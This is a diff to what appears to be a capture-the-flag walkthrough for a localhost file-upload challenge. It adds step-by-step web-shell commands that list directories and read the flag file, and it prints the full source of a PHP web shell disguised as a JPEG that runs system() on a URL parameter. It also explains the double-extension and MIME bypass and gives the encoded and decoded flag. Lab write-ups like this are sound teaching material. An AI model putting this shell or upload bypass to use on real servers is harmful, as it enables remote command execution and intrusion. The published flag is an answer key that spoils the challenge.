@@ -77,22 +77,66 @@ if (isset($_GET['cmd'])) {
 2. Navigate to `/uploads/shell.php.jpg` in the browser
 
 ### Step 3: Find the Flag
-1. List directories:
-```
-http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var/hidden/level1/level2
-```
+This step involves exploring the server's file system to locate and retrieve the hidden flag. The process requires multiple commands and careful enumeration:
 
-2. Read the flag:
-```
-http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/var/hidden/level1/level2/secret_flag.txt
-```
+1. **Initial Directory Enumeration**
+   ```
+   # First, check the root of hidden directory
+   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/
+   
+   # Then explore level1 directory
+   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/
+   
+   # Finally, check level2 directory
+   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/level2/
+   ```
 
-### Step 4: Decode the Flag
-1. The output will be Base64 encoded
-2. Decode using any of these methods:
-   - Online Base64 decoder
-   - Command line: `echo "BASE64_STRING" | base64 -d`
-   - PowerShell: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))`
+   **Example Exploration Process:**
+   1. First, list contents of /var directory:
+   ```
+   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var
+
+   Expected Output:
+   Command received: ls /var
+   Executing...
+   backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
+   Return value: 0
+   ```
+   Note: The `hidden` directory in the output confirms our target location.
+
+   2. Explore the hidden directory:
+   ```
+   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var/hidden
+
+   Expected Output:
+   Command received: ls /var/hidden
+   Executing...
+   level1
+   Return value: 0
+   ```
+   This confirms the nested directory structure and guides our next steps.
+
+2. **Advanced Enumeration Techniques**
+   - If standard `ls` is blocked, try alternatives:
+   ```
+   # Using find command
+   http://localhost:8080/uploads/shell.php.jpg?cmd=find /var/hidden -type f
+   
+   # Using dir command
+   http://localhost:8080/uploads/shell.php.jpg?cmd=dir /var/hidden/level1/level2/
+   ```
+
+3. **Reading the Flag File**
+   - Multiple methods to read the flag content:
+   ```
+   # Using cat (primary method)
+   http://localhost:8080/uploads/shell.php.jpg?cmd=cat /var/hidden/level1/level2/secret_flag.txt
+   
+   # Alternative reading methods if cat is blocked
+   http://localhost:8080/uploads/shell.php.jpg?cmd=head -n 1 /var/hidden/level1/level2/secret_flag.txt
+   http://localhost:8080/uploads/shell.php.jpg?cmd=more /var/hidden/level1/level2/secret_flag.txt
+   http://localhost:8080/uploads/shell.php.jpg?cmd=less /var/hidden/level1/level2/secret_flag.txt
+   ```
 
 ## Available Hints
 1. "Check the MIME type bypass techniques"
@@ -111,3 +155,59 @@ http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/var/hidden/level1/level2/
 ## Flag Format
 - Encoded: `UmVhbEZsYWd7VGgxc18xc19OMHRfVGgzX0ZsNGdfWTB1X1czbnR9`
 - Decoded: `RealFlag{Th1s_1s_N0t_Th3_Fl4g_Y0u_W3nt}`
+
+## Payload Explanation
+
+The payload (`shell.php.jpg`) is crafted to bypass upload restrictions and enable command execution. Let's break down each component:
+
+### 1. File Name Structure
+- `shell.php.jpg`: Uses double extension to bypass file type checks
+  - The server sees `.jpg` and thinks it's an image
+  - But PHP will still execute it as `.php` file
+
+### 2. Content Breakdown
+```php
+JFIF;
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo "Command received: $cmd<br>";
+    echo "Executing...<br>";
+    system($cmd, $retval);
+    echo "Return value: $retval<br>";
+} else {
+    echo "No command provided.";
+}
+?>
+```
+
+#### Key Components:
+1. **JFIF Header**
+   - `JFIF;` at the start tricks MIME type checks
+   - Makes the file look like a valid JPEG image
+
+2. **PHP Code Section**
+   - `isset($_GET['cmd'])`: Checks if a command was provided in URL
+   - `$cmd = $_GET['cmd']`: Retrieves the command from GET parameter
+   - `system($cmd, $retval)`: Executes the system command
+   - `$retval`: Captures the command's exit status
+
+3. **Output Structure**
+   - Shows received command
+   - Indicates execution status
+   - Displays command output
+   - Shows return value for debugging
+
+### Usage Example
+```
+http://localhost:8080/uploads/shell.php.jpg?cmd=whoami
+```
+
+### Security Implications
+- Allows remote command execution
+- Bypasses file upload restrictions
+- Provides detailed command execution feedback
+- Can be used to explore server filesystem
+- Enables privilege escalation attempts
+
+Note: This payload is for educational purposes in CTF challenges. Using such code in production environments would create serious security vulnerabilities.
